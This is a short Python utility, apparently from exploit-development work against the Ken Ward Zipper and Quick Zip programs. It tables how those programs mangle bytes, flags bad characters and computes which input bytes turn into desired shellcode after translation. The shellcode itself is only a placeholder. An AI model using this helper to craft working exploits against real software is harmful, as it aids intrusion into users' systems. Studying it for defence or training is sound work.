#!/usr/bin/python3
#
# translator for zip programs using weird byte translation
# built for Ken Ward Zipper 1.4 exploit code
# and Quick Zip 4.6

translator = {227: 112, 226: 71, 225: 223, 224: 97, 231: 116, 230: 181, 229: 115, 228: 83, 
              235: 100, 234: 79, 233: 84, 232: 70, 239: 110, 238: 101, 237: 102, 236: 56, 
              243: 61, 242: 61, 241: 177, 240: 61, 247: 152, 246: 247, 245: 41, 244: 40, 
              251: 118, 250: 183, 249: 183, 248: 176, 255: 160, 254: 166, 253: 178, 252: 110,
              195: 43, 194: 45, 193: 45, 192: 43, 199: 166, 198: 166, 197: 43, 196: 45, 
              203: 45, 202: 45, 201: 43, 200: 43, 207: 45, 206: 43, 205: 45, 204: 166, 211: 43, 
              210: 45, 209: 45, 208: 45, 215: 43, 214: 43, 213: 43, 212: 43, 219: 166, 218: 43,
              217: 43, 216: 43, 223: 175, 222: 166, 221: 166, 220: 95,163: 250, 162: 243, 
              161: 237, 160: 225, 167: 186, 166: 170, 165: 209, 164: 241, 171: 189, 170: 172, 
              169: 172, 168: 191, 175: 187, 174: 171, 173: 161, 172: 188, 179: 166, 178: 166, 
              177: 166, 176: 166, 183: 43, 182: 166, 181: 166, 180: 166, 187: 43, 186: 166, 
              185: 166, 184: 43, 191: 43, 190: 43, 189: 43, 188: 43,131: 226, 130: 233, 129: 252,
              128: 199, 135: 231, 134: 229, 133: 224, 132: 228, 139: 239, 138: 232, 137: 235, 
              136: 234, 143: 197, 142: 196, 141: 236, 140: 238, 147: 244, 146: 198, 145: 230, 
              144: 201, 151: 249, 150: 251, 149: 242, 148: 246, 155: 162, 154: 220, 153: 214, 
              152: 255, 159: 131, 158: 80, 157: 165, 156: 163,15:164,20:182,21:167}

# These chars break your exploit
badchars = [0,47,58,92]

# Put shellcode here to be translated
shellcode = b"\x41\x77\x83\x41"

formatted = ""

formatted2 = ""
 
for x in shellcode:
    if x in badchars:
        print("**BAD CHAR DETECTED: " + hex(x))
        formatted += "\033[0;37;41m\\x"
        formatted += "%02x\033[0;m" % x
    else:
        # check to see if value is in the list of values that the application mangles
        if x in translator.keys():
            # checks to see if the mangle value can be recovered by the application's own translation
            if x in translator.values():
                # creates list of values needed for desried shellcode if able
                y = list(translator.keys())[list(translator.values()).index(x)]
                value = (x, y)
                print("Value \\x%02x generated by value \\x%02x " % value)
                formatted2 += "\033[1;32m\\x"
                formatted2 += "%02x\033[1;m" % y
            else:
                # Clears out formatted string if unable to create desired shellcode through translation
                print("Value \\x%02x unable to be generated" % x)
                if formatted2:
                    print("Dumping translation string")
                    formatted2 = ""
            x = translator[x]
            # Creates a string of what the application will translate your shellcode to
            formatted += "\033[1;31m\\x"
            formatted += '%02x\033[1;m' % x
        else:
            formatted += "\\x"
            formatted2 += "\\x"
            formatted += '%02x' % x
            formatted2 += '%02x' % x

print("Translated values: " + formatted)
print("Length: " + str(len(shellcode)) + " bytes")
print("Original values:   " + ''.join(['\\x%02x' % b for b in shellcode]))
if len(formatted) == len(formatted2):
    print("Change your shellcode to these values: " + formatted2)
else: 
    print("Unable to generate desired shellcode via translation")
